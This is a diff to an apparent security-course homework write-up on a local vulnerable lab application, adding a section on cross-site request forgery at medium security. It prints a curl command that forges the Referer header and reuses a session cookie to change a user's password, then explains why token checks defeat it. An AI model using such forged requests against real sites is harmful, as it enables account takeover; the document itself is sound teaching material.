@@ -120,6 +120,22 @@ Higher security uses tokens to verify legitimate requests.
 
 ---
 
+### MEDIUM
+**Payload Used:**  
+`curl.exe -v --referer "http://localhost:8080/vulnerabilities/csrf/" "http://localhost:8080/vulnerabilities/csrf/?password_new=pwn&password_conf=pwn&Change=Change#" -b "PHPSESSID=r0mns51mv27k5ot51g8fea50h1; security=medium"`
+
+**Result:**  
+User password changed successfully.  
+![csrf2](cybersechw2imgs/csrf2.png)
+
+**Why it worked:**  
+We manually set the Referer header to match the expected page, so the request was accepted by the server.
+
+**Why it failed at higher level:**  
+At higher security levels, the request requires a unique CSRF token, which cannot be easily recreated or guessed.
+
+---
+
 ## File Inclusion
 
 ### LOW
